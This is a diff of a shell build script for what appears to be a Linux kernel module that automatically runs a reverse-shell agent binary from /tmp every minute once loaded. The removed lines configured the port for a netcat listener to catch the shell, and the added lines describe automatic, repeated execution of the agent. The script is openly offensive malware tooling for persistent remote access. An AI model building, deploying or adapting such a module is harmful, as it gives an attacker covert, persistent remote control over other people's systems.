@@ -62,42 +62,15 @@ fi
 echo -e "${GREEN}[+] System requirements satisfied.${NC}"
 echo ""
 
-# Get current configuration
-echo -e "${BLUE}[*] Current configuration:${NC}"
-CURRENT_IP=$(grep "YOUR_SRV_IP" config.h | cut -d'"' -f2)
-CURRENT_PORT=$(grep "YOUR_SRV_PORT" config.h | awk '{print $3}')
-
-echo -e "  Server IP: ${YELLOW}$CURRENT_IP${NC}"
-echo -e "  Server Port: ${YELLOW}$CURRENT_PORT${NC}"
+# Configuration info
+echo -e "${BLUE}[*] Agent Configuration:${NC}"
+echo -e "  Agent Binary: ${YELLOW}/tmp/revershell-agent.bin${NC}"
+echo -e "  Execution Interval: ${YELLOW}60 seconds (1 minute)${NC}"
+echo -e "  Execution Mode: ${YELLOW}Automatic${NC}"
 echo ""
-
-# Prompt for configuration
-echo -e "${BLUE}[*] Configuration Setup${NC}"
-echo -e "${YELLOW}[!] Enter the port where you will run netcat to receive the reverse shell:${NC}"
-read -p "Server Port [$CURRENT_PORT]: " NEW_PORT
-NEW_PORT=${NEW_PORT:-$CURRENT_PORT}
-
-# Validate port
-if ! [[ "$NEW_PORT" =~ ^[0-9]+$ ]] || [ "$NEW_PORT" -lt 1 ] || [ "$NEW_PORT" -gt 65535 ]; then
-    echo -e "${RED}[!] Invalid port number. Must be between 1-65535.${NC}"
-    exit 1
-fi
-
+echo -e "${YELLOW}[!] Make sure to place your revershell-agent.bin in /tmp/ directory${NC}"
+echo -e "${YELLOW}[!] The agent will be executed automatically every minute once the module is loaded${NC}"
 echo ""
-echo -e "${BLUE}[*] New configuration:${NC}"
-echo -e "  Server IP: ${YELLOW}$CURRENT_IP${NC} (unchanged)"
-echo -e "  Server Port: ${GREEN}$NEW_PORT${NC}"
-echo ""
-
-# Backup original config
-echo -e "${BLUE}[*] Backing up original config.h...${NC}"
-cp config.h config.h.backup
-
-# Update configuration
-echo -e "${BLUE}[*] Updating configuration...${NC}"
-sed -i "s/#define YOUR_SRV_PORT.*/#define YOUR_SRV_PORT $NEW_PORT/" config.h
-
-echo -e "${GREEN}[+] Configuration updated successfully.${NC}"
 
 # Clean previous builds
 echo -e "${BLUE}[*] Cleaning previous builds...${NC}"
@@ -109,8 +82,6 @@ if make; then
     echo -e "${GREEN}[+] Module built successfully.${NC}"
 else
     echo -e "${RED}[!] Build failed. Check the output above for errors.${NC}"
-    echo -e "${BLUE}[*] Restoring original configuration...${NC}"
-    mv config.h.backup config.h
     exit 1
 fi
 
